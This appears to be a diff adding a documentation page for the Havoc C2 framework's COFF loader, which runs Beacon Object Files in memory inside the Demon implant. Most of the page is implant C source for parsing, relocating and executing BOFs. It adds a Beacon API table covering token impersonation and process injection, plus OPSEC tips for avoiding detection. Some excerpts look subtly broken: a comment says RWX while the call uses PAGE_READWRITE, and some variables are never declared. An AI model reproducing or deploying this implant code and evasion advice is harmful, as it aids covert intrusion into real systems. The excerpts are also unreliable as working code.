@@ -1,0 +1,634 @@
+---
+title: 'COFF Loader'
+description: 'Beacon Object File (BOF) loader with Beacon API compatibility'
+icon: 'file-code'
+---
+
+## Overview
+
+Havoc includes a COFF (Common Object File Format) loader that executes Beacon Object Files (BOFs) in-memory. This allows operators to run small, position-independent code modules without spawning new processes or loading full executables.
+
+<Info>
+  The COFF loader provides Beacon API compatibility, allowing most Cobalt Strike BOFs to run unmodified in Havoc agents.
+</Info>
+
+## Architecture
+
+### COFF File Structure
+
+BOFs are compiled as object files (not linked executables):
+
+**Source**: `payloads/Demon/include/core/CoffeeLdr.h`
+
+```c
+typedef struct _COFF_FILE_HEADER {
+    UINT16 Machine;                   // Target architecture
+    UINT16 NumberOfSections;          // Section count
+    UINT32 TimeDateStamp;
+    UINT32 PointerToSymbolTable;      // Symbol table offset
+    UINT32 NumberOfSymbols;           // Symbol count
+    UINT16 SizeOfOptionalHeader;
+    UINT16 Characteristics;
+} COFF_FILE_HEADER, *PCOFF_FILE_HEADER;
+
+typedef struct _COFF_SECTION {
+    CHAR   Name[8];                   // Section name
+    UINT32 VirtualSize;
+    UINT32 VirtualAddress;
+    UINT32 SizeOfRawData;             // Section size
+    UINT32 PointerToRawData;          // Data offset
+    UINT32 PointerToRelocations;      // Relocation offset
+    UINT32 PointerToLinenumbers;
+    UINT16 NumberOfRelocations;       // Relocation count
+    UINT16 NumberOfLinenumbers;
+    UINT32 Characteristics;           // Section flags
+} COFF_SECTION, *PCOFF_SECTION;
+
+typedef struct _COFF_RELOC {
+    UINT32 VirtualAddress;            // Where to apply relocation
+    UINT32 SymbolTableIndex;          // Which symbol
+    UINT16 Type;                      // Relocation type
+} COFF_RELOC, *PCOFF_RELOC;
+```
+
+### Loader Context
+
+**Source**: `payloads/Demon/include/core/CoffeeLdr.h`
+
+```c
+typedef struct _COFFEE {
+    PVOID              Data;           // Raw COFF data
+    PVOID              ImageBase;      // Allocated memory base
+    SIZE_T             BofSize;        // Total BOF size
+    PCOFF_FILE_HEADER  Header;         // COFF header
+    PCOFF_SECTION      Section;        // Current section
+    PCOFF_SYMBOL       Symbol;         // Symbol table
+    PCOFF_RELOC        Reloc;          // Relocation table
+    PSECTION_MAP       SecMap;         // Section mapping
+    PVOID              FunMap;         // Function pointer map
+    SIZE_T             FunMapSize;     // Function map size
+    UINT32             RequestID;      // Command request ID
+    struct _COFFEE*    Next;           // Linked list
+} COFFEE, *PCOFFEE;
+```
+
+## Loading Process
+
+### 1. COFF Parsing
+
+**Source**: `payloads/Demon/src/core/CoffeeLdr.c:672`
+
+```c
+VOID CoffeeLdr(
+    PCHAR EntryName,
+    PVOID CoffeeData,
+    PVOID ArgData,
+    SIZE_T ArgSize,
+    UINT32 RequestID
+) {
+    PCOFFEE Coffee = NULL;
+    
+    Coffee = Instance->Win32.LocalAlloc(LPTR, sizeof(COFFEE));
+    Coffee->Data      = CoffeeData;
+    Coffee->Header    = Coffee->Data;  // COFF header at start
+    Coffee->Symbol    = C_PTR(U_PTR(Coffee->Data) + 
+                              Coffee->Header->PointerToSymbolTable);
+    Coffee->RequestID = RequestID;
+    Coffee->Next      = Instance->Coffees;
+    Instance->Coffees = Coffee;
+    
+    // Validate architecture
+#if _WIN64
+    if (Coffee->Header->Machine != IMAGE_FILE_MACHINE_AMD64) {
+        PUTS("The BOF is not AMD64");
+        goto END;
+    }
+#else
+    if (Coffee->Header->Machine == IMAGE_FILE_MACHINE_AMD64) {
+        PUTS("The BOF is AMD64");
+        goto END;
+    }
+#endif
+    
+    Coffee->SecMap = Instance->Win32.LocalAlloc(
+        LPTR,
+        Coffee->Header->NumberOfSections * sizeof(SECTION_MAP)
+    );
+    
+    // Calculate function map size
+    Coffee->FunMapSize = CoffeeGetFunMapSize(Coffee);
+}
+```
+
+### 2. Memory Allocation
+
+**Source**: `payloads/Demon/src/core/CoffeeLdr.c:728`
+
+```c
+// Calculate total BOF size (page-aligned sections + function map)
+for (UINT16 SecCnt = 0; SecCnt < Coffee->Header->NumberOfSections; SecCnt++) {
+    Coffee->Section = C_PTR(U_PTR(Coffee->Data) + 
+                           sizeof(COFF_FILE_HEADER) + 
+                           U_PTR(sizeof(COFF_SECTION) * SecCnt));
+    Coffee->BofSize += Coffee->Section->SizeOfRawData;
+    Coffee->BofSize = (SIZE_T)(ULONG_PTR)PAGE_ALLIGN(Coffee->BofSize);
+}
+
+// Add function map at end
+Coffee->BofSize += Coffee->FunMapSize;
+
+// Allocate RWX memory
+Coffee->ImageBase = MmVirtualAlloc(
+    DX_MEM_DEFAULT,
+    NtCurrentProcess(),
+    Coffee->BofSize,
+    PAGE_READWRITE
+);
+
+// Copy sections into allocated memory
+NextBase = Coffee->ImageBase;
+for (UINT16 SecCnt = 0; SecCnt < Coffee->Header->NumberOfSections; SecCnt++) {
+    Coffee->Section = C_PTR(U_PTR(Coffee->Data) + 
+                           sizeof(COFF_FILE_HEADER) + 
+                           U_PTR(sizeof(COFF_SECTION) * SecCnt));
+    Coffee->SecMap[SecCnt].Size = Coffee->Section->SizeOfRawData;
+    Coffee->SecMap[SecCnt].Ptr  = NextBase;
+    
+    NextBase += Coffee->Section->SizeOfRawData;
+    NextBase = PAGE_ALLIGN(NextBase);
+    
+    // Copy section data
+    MemCopy(
+        Coffee->SecMap[SecCnt].Ptr,
+        C_PTR(U_PTR(CoffeeData) + Coffee->Section->PointerToRawData),
+        Coffee->Section->SizeOfRawData
+    );
+}
+
+// Function map at end
+Coffee->FunMap = NextBase;
+```
+
+### 3. Symbol Resolution
+
+**Source**: `payloads/Demon/src/core/CoffeeLdr.c:87`
+
+```c
+BOOL CoffeeProcessSymbol(
+    PCOFFEE Coffee,
+    LPSTR SymbolName,
+    UINT16 SymbolType,
+    PVOID* pFuncAddr
+) {
+    PCHAR SymLibrary  = NULL;
+    PCHAR SymFunction = NULL;
+    HMODULE hLibrary  = NULL;
+    DWORD SymBeacon   = HashEx(SymbolName, COFF_PREP_BEACON_SIZE, FALSE);
+    
+    *pFuncAddr = NULL;
+    
+    if (SymBeacon == COFF_PREP_BEACON) {
+        // Beacon API function: __imp_BeaconFUNCNAME
+        SymFunction = SymbolName + COFF_PREP_SYMBOL_SIZE;
+        
+        for (DWORD i = 0;; i++) {
+            if (!BeaconApi[i].NameHash)
+                break;
+            
+            if (HashStringA(SymFunction) == BeaconApi[i].NameHash) {
+                *pFuncAddr = BeaconApi[i].Pointer;
+                return TRUE;
+            }
+        }
+    }
+    else if (SymbolIsImport(SymbolName) && 
+             SymbolIncludesLibrary(SymbolName)) {
+        // Standard import: __imp_LIBNAME$FUNCNAME
+        SymLibrary  = Bak + COFF_PREP_SYMBOL_SIZE;
+        SymLibrary  = StringTokenA(SymLibrary, "$");
+        SymFunction = SymLibrary + StringLengthA(SymLibrary) + 1;
+        hLibrary    = LdrModuleLoad(SymLibrary);
+        
+        if (!hLibrary) {
+            goto SymbolNotFound;
+        }
+        
+        // Special handling for NTDLL (use syscalls)
+        if (hLibrary == Instance->Modules.Ntdll) {
+            for (DWORD i = 0;; i++) {
+                if (!NtApi[i].NameHash)
+                    break;
+                
+                if (HashStringA(SymName) == NtApi[i].NameHash) {
+                    *pFuncAddr = NtApi[i].Pointer;
+                    return TRUE;
+                }
+            }
+        }
+        
+        // Resolve using LdrGetProcedureAddress
+        AnsiString.Buffer = SymName;
+        AnsiString.Length = StringLengthA(SymName);
+        AnsiString.MaximumLength = AnsiString.Length + sizeof(CHAR);
+        
+        if (NT_SUCCESS(Instance->Win32.LdrGetProcedureAddress(
+            hLibrary, &AnsiString, 0, pFuncAddr
+        ))) {
+            return TRUE;
+        }
+    }
+    else if (HashStringA(SymbolName) == COFF_INSTANCE) {
+        // Special symbol: .refptr.Instance or _Instance
+        *pFuncAddr = &Instance;
+        return TRUE;
+    }
+    
+SymbolNotFound:
+    // Send error to operator
+    Package = PackageCreateWithRequestID(
+        DEMON_COMMAND_INLINE_EXECUTE,
+        Coffee->RequestID
+    );
+    PackageAddInt32(Package, DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND);
+    PackageAddString(Package, SymbolName);
+    PackageTransmit(Package);
+    
+    return FALSE;
+}
+```
+
+### 4. Relocation Processing
+
+**Source**: `payloads/Demon/src/core/CoffeeLdr.c:423`
+
+```c
+BOOL CoffeeProcessSections(PCOFFEE Coffee) {
+    PVOID FuncPtr = NULL;
+    DWORD FuncCount = 0;
+    UINT32 Offset = 0;
+    PVOID RelocAddr = NULL;
+    PVOID FunMapAddr = NULL;
+    PVOID SymbolSectionAddr = NULL;
+    
+    for (UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++) {
+        Coffee->Section = C_PTR(U_PTR(Coffee->Data) + 
+                               sizeof(COFF_FILE_HEADER) + 
+                               U_PTR(sizeof(COFF_SECTION) * SectionCnt));
+        Coffee->Reloc = C_PTR(U_PTR(Coffee->Data) + 
+                             Coffee->Section->PointerToRelocations);
+        
+        for (DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++) {
+            Symbol = &Coffee->Symbol[Coffee->Reloc->SymbolTableIndex];
+            
+            // Get symbol name
+            if (Symbol->First.Value[0] != 0) {
+                MemSet(SymName, 0, sizeof(SymName));
+                MemCopy(SymName, Symbol->First.Name, 8);
+                SymbolName = SymName;
+            } else {
+                SymbolName = ((PCHAR)(Coffee->Symbol + 
+                                     Coffee->Header->NumberOfSymbols)) + 
+                            Symbol->First.Value[1];
+            }
+            
+            // Resolve symbol
+            if (!CoffeeProcessSymbol(Coffee, SymbolName, SymbolType, &FuncPtr)) {
+                return FALSE;
+            }
+            
+            RelocAddr = Coffee->SecMap[SectionCnt].Ptr + 
+                       Coffee->Reloc->VirtualAddress;
+            FunMapAddr = Coffee->FunMap + (FuncCount * sizeof(PVOID));
+            SymbolSectionAddr = Coffee->SecMap[Symbol->SectionNumber - 1].Ptr;
+            
+#if _WIN64
+            // Process x64 relocations
+            if (Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr != NULL) {
+                // External function call
+                *((PVOID*)FunMapAddr) = FuncPtr;
+                Offset = (UINT32)(U_PTR(FunMapAddr) - U_PTR(RelocAddr) - sizeof(UINT32));
+                *((PUINT32)RelocAddr) = Offset;
+                FuncCount++;
+            }
+            else if (Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr == NULL) {
+                // Internal symbol reference
+                Offset = *(PUINT32)(RelocAddr);
+                Offset += U_PTR(SymbolSectionAddr) - U_PTR(RelocAddr) - sizeof(UINT32);
+                *((PUINT32)RelocAddr) = Offset;
+            }
+            else if (Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64 && FuncPtr == NULL) {
+                // 64-bit absolute address
+                OffsetLong = *(PUINT64)(RelocAddr);
+                OffsetLong += U_PTR(SymbolSectionAddr);
+                *((PUINT64)RelocAddr) = OffsetLong;
+            }
+#else
+            // Process x86 relocations
+            if (Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr != NULL) {
+                *((PVOID*)FunMapAddr) = FuncPtr;
+                Offset = U_PTR(FunMapAddr);
+                *((PUINT32)RelocAddr) = Offset;
+                FuncCount++;
+            }
+            else if (Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr == NULL) {
+                Offset = *(PUINT32)(RelocAddr);
+                Offset += U_PTR(SymbolSectionAddr);
+                *((PUINT32)RelocAddr) = Offset;
+            }
+#endif
+            
+            Coffee->Reloc = C_PTR(U_PTR(Coffee->Reloc) + sizeof(COFF_RELOC));
+        }
+    }
+    
+    return TRUE;
+}
+```
+
+### 5. Memory Protection
+
+**Source**: `payloads/Demon/src/core/CoffeeLdr.c:276`
+
+```c
+// Set appropriate permissions for each section
+for (UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++) {
+    Coffee->Section = C_PTR(U_PTR(Coffee->Data) + 
+                           sizeof(COFF_FILE_HEADER) + 
+                           U_PTR(sizeof(COFF_SECTION) * SectionCnt));
+    
+    if (Coffee->Section->SizeOfRawData > 0) {
+        BitMask = Coffee->Section->Characteristics & 
+                 (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE);
+        
+        if (BitMask == 0)
+            Protection = PAGE_NOACCESS;
+        else if (BitMask == IMAGE_SCN_MEM_EXECUTE)
+            Protection = PAGE_EXECUTE;
+        else if (BitMask == IMAGE_SCN_MEM_READ)
+            Protection = PAGE_READONLY;
+        else if (BitMask == (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE))
+            Protection = PAGE_EXECUTE_READ;
+        else if (BitMask == IMAGE_SCN_MEM_WRITE)
+            Protection = PAGE_WRITECOPY;
+        else if (BitMask == (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE))
+            Protection = PAGE_EXECUTE_WRITECOPY;
+        else if (BitMask == (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE))
+            Protection = PAGE_READWRITE;
+        else if (BitMask == (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE))
+            Protection = PAGE_EXECUTE_READWRITE;
+        
+        if ((Coffee->Section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == 
+            IMAGE_SCN_MEM_NOT_CACHED)
+            Protection |= PAGE_NOCACHE;
+        
+        MmVirtualProtect(
+            DX_MEM_SYSCALL,
+            NtCurrentProcess(),
+            Coffee->SecMap[SectionCnt].Ptr,
+            Coffee->SecMap[SectionCnt].Size,
+            Protection
+        );
+    }
+}
+```
+
+### 6. Execution
+
+**Source**: `payloads/Demon/src/core/CoffeeLdr.c:241`
+
+```c
+VOID CoffeeFunction(PVOID Address, PVOID Argument, SIZE_T Size) {
+    VOID (*Function)(PCHAR, ULONG) = Address;
+    
+    // Save return address for exception handler
+    CoffeeFunctionReturn = __builtin_extract_return_addr(
+        __builtin_return_address(0)
+    );
+    
+    // Execute BOF entry point
+    Function(Argument, Size);
+}
+
+BOOL CoffeeExecuteFunction(
+    PCOFFEE Coffee,
+    PCHAR Function,
+    PVOID Argument,
+    SIZE_T Size,
+    UINT32 RequestID
+) {
+    PVOID CoffeeMain = NULL;
+    PVOID VehHandle  = NULL;
+    
+    if (Instance->Config.Implant.CoffeeVeh) {
+        // Register exception handler for crashes
+        VehHandle = Instance->Win32.RtlAddVectoredExceptionHandler(
+            1, &VehDebugger
+        );
+    }
+    
+    // Find entry point (typically "go")
+    for (DWORD SymCounter = 0; SymCounter < Coffee->Header->NumberOfSymbols; SymCounter++) {
+        if (Coffee->Symbol[SymCounter].First.Value[0] != 0)
+            SymbolName = Coffee->Symbol[SymCounter].First.Name;
+        else
+            SymbolName = ((PCHAR)(Coffee->Symbol + 
+                                 Coffee->Header->NumberOfSymbols)) + 
+                        Coffee->Symbol[SymCounter].First.Value[1];
+        
+#if _M_IX86
+        // x86 may have leading underscore
+        if (SymbolName[0] == '_')
+            SymbolName++;
+#endif
+        
+        if (MemCompare(SymbolName, Function, FunctionLength) == 0) {
+            CoffeeMain = Coffee->SecMap[Coffee->Symbol[SymCounter].SectionNumber - 1].Ptr + 
+                        Coffee->Symbol[SymCounter].Value;
+            break;
+        }
+    }
+    
+    if (!CoffeeMain) {
+        PRINTF("[!] Couldn't find function => %s\n", Function);
+        return FALSE;
+    }
+    
+    // Execute
+    CoffeeFunction(CoffeeMain, Argument, Size);
+    
+    // Remove exception handler
+    if (VehHandle) {
+        Instance->Win32.RtlRemoveVectoredExceptionHandler(VehHandle);
+    }
+    
+    return TRUE;
+}
+```
+
+## Beacon API Compatibility
+
+Havoc provides Beacon API functions for BOF compatibility:
+
+**Source**: `payloads/Demon/src/core/ObjectApi.c`
+
+<Accordion title="Beacon API Functions">
+```c
+BeaconAPI[] = {
+    { H_API_BEACONDATAPARSE,           BeaconDataParse           },
+    { H_API_BEACONDATAINT,             BeaconDataInt             },
+    { H_API_BEACONDATASHORT,           BeaconDataShort           },
+    { H_API_BEACONDATALENGTH,          BeaconDataLength          },
+    { H_API_BEACONDATAEXTRACT,         BeaconDataExtract         },
+    { H_API_BEACONFORMATALLOC,         BeaconFormatAlloc         },
+    { H_API_BEACONFORMATRESET,         BeaconFormatReset         },
+    { H_API_BEACONFORMATFREE,          BeaconFormatFree          },
+    { H_API_BEACONFORMATAPPEND,        BeaconFormatAppend        },
+    { H_API_BEACONFORMATPRINTF,        BeaconFormatPrintf        },
+    { H_API_BEACONFORMATTOSTRING,      BeaconFormatToString      },
+    { H_API_BEACONFORMATINT,           BeaconFormatInt           },
+    { H_API_BEACONPRINTF,              BeaconPrintf              },
+    { H_API_BEACONOUTPUT,              BeaconOutput              },
+    { H_API_BEACONUSETOKEN,            BeaconUseToken            },
+    { H_API_BEACONREVERTTOKEN,         BeaconRevertToken         },
+    { H_API_BEACONISADMIN,             BeaconIsAdmin             },
+    { H_API_BEACONGETSPAWNTO,          BeaconGetSpawnTo          },
+    { H_API_BEACONINJECTPROCESS,       BeaconInjectProcess       },
+    { H_API_BEACONINJECTTEMPORARYPROCESS, BeaconInjectTemporaryProcess },
+    { H_API_BEACONSPAWNTEMPORARYPROCESS,  BeaconSpawnTemporaryProcess  },
+    { H_API_BEACONCLEANUPPROCESS,      BeaconCleanupProcess      },
+    { H_API_TOWIDE,                    toWideChar                },
+    { 0, NULL }
+};
+```
+</Accordion>
+
+## Exception Handling
+
+**Source**: `payloads/Demon/src/core/CoffeeLdr.c:32`
+
+```c
+LONG WINAPI VehDebugger(PEXCEPTION_POINTERS Exception) {
+    UINT32 RequestID = 0;
+    PPACKAGE Package = NULL;
+    
+    PRINTF("Exception: %p\n", Exception->ExceptionRecord->ExceptionCode);
+    
+    // Return to caller
+#if _WIN64
+    Exception->ContextRecord->Rip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;
+#else
+    Exception->ContextRecord->Eip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;
+#endif
+    
+    // Notify operator
+    Package = PackageCreateWithRequestID(
+        DEMON_COMMAND_INLINE_EXECUTE,
+        RequestID
+    );
+    PackageAddInt32(Package, DEMON_COMMAND_INLINE_EXECUTE_EXCEPTION);
+    PackageAddInt32(Package, Exception->ExceptionRecord->ExceptionCode);
+    PackageAddInt64(Package, 
+                   (UINT64)(ULONG_PTR)Exception->ExceptionRecord->ExceptionAddress);
+    PackageTransmit(Package);
+    
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+```
+
+## Cleanup
+
+**Source**: `payloads/Demon/src/core/CoffeeLdr.c:394`
+
+```c
+VOID CoffeeCleanup(PCOFFEE Coffee) {
+    PVOID Pointer = NULL;
+    SIZE_T Size = 0;
+    NTSTATUS NtStatus = 0;
+    
+    if (!Coffee || !Coffee->ImageBase)
+        return;
+    
+    // Zero memory before freeing
+    if (MmVirtualProtect(
+        DX_MEM_SYSCALL,
+        NtCurrentProcess(),
+        Coffee->ImageBase,
+        Coffee->BofSize,
+        PAGE_READWRITE
+    )) {
+        MemSet(Coffee->ImageBase, 0, Coffee->BofSize);
+    }
+    
+    // Free allocated memory
+    Pointer = Coffee->ImageBase;
+    Size = Coffee->BofSize;
+    SysNtFreeVirtualMemory(
+        NtCurrentProcess(),
+        &Pointer,
+        &Size,
+        MEM_RELEASE
+    );
+    
+    // Free section map
+    if (Coffee->SecMap) {
+        MemSet(Coffee->SecMap, 0, 
+               Coffee->Header->NumberOfSections * sizeof(SECTION_MAP));
+        Instance->Win32.LocalFree(Coffee->SecMap);
+        Coffee->SecMap = NULL;
+    }
+}
+```
+
+## OPSEC Considerations
+
+<Warning>
+**Detection Vectors**:
+
+1. **Unusual Memory Allocations**: RWX memory for BOF execution
+2. **In-Memory Code**: Executable code without backing file
+3. **API Call Patterns**: Beacon API usage from unexpected locations
+4. **Exception Handlers**: VEH registration for crash handling
+5. **Memory Scanning**: BOF signatures in process memory
+</Warning>
+
+### Mitigation
+
+1. **Memory Protection**: Use RW then RX (not RWX)
+2. **Code Obfuscation**: Encrypt BOFs before loading
+3. **Limited Execution**: Run BOFs sparingly
+4. **Clean Memory**: Ensure proper cleanup after execution
+
+## Usage
+
+```
+# Execute BOF with no arguments
+inline-execute-bof /path/to/bof.o
+
+# Execute BOF with arguments (packed binary)
+inline-execute-bof /path/to/bof.o args_packed
+
+# Specify entry point
+inline-execute-bof /path/to/bof.o go args_packed
+```
+
+## Advantages Over .NET
+
+1. **Smaller Footprint**: No CLR loading required
+2. **Faster Execution**: Direct native code execution
+3. **Less Suspicious**: No .NET assemblies in memory
+4. **Better OPSEC**: Smaller attack surface
+5. **Flexibility**: Can use any Windows API directly
+
+## Related Techniques
+
+- [Indirect Syscalls](/advanced/indirect-syscalls) - BOFs can use syscalls
+- [.NET Execution](/advanced/dotnet-execution) - Alternative execution method
+- [Token Management](/advanced/token-management) - Used by BOFs via Beacon API
+
+## References
+
+- COFF loader: `payloads/Demon/src/core/CoffeeLdr.c`
+- Beacon API: `payloads/Demon/src/core/ObjectApi.c`
+- COFF structures: `payloads/Demon/include/core/CoffeeLdr.h`
+- Cobalt Strike BOF documentation
+- Microsoft PE/COFF specification
